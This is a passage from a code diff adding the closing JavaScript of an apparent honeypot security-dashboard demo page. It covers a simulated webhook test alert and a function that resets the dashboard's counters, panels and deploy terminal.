+    statusEl.textContent = '✗ Please enter a webhook URL first.';
+    return;
+  }
+  statusEl.style.color = 'var(--yellow)';
+  statusEl.textContent = '◌ Sending test alert...';
+  setTimeout(() => {
+    statusEl.style.color = 'var(--green)';
+    statusEl.textContent = `✓ Test alert sent to ${url.length > 50 ? url.slice(0,50)+'…' : url}`;
+  }, 1200);
+}
+
+// ── RESET ─────────────────────────────────────────────────────────────────────
+
+function resetDashboard() {
+  deployed = false;
+  alertCount = 0;
+  criticalCount = 0;
+  accessCount = 0;
+  if (alertInterval) clearTimeout(alertInterval);
+  alertInterval = null;
+
+  document.getElementById('stat-alerts').textContent   = '0';
+  document.getElementById('stat-critical').textContent = '0';
+  document.getElementById('stat-decoys').textContent   = '0';
+  document.getElementById('stat-last').textContent     = '—';
+  document.getElementById('live-indicator').style.display = 'none';
+  document.getElementById('inv-title').style.display   = 'none';
+  document.getElementById('inventory-panel').style.display = 'none';
+  document.getElementById('live-section').style.display    = 'none';
+  document.getElementById('webhook-panel').style.display   = 'none';
+
+  const t = document.getElementById('deploy-terminal');
+  t.innerHTML = `<div class="t-dim">// Deception-Based Security System — SOC demo</div>
+<div class="t-dim">// Press "Deploy Honeypots" to initialize the honeypot grid.</div>
+<div>&nbsp;</div>
+<div><span class="t-green">$</span> <span class="cursor"></span></div>`;
+
+  const btn = document.getElementById('deploy-btn');
+  btn.disabled = false;
+  btn.textContent = 'Deploy Honeypots';
+}
+</script>
+</body>
+</html>
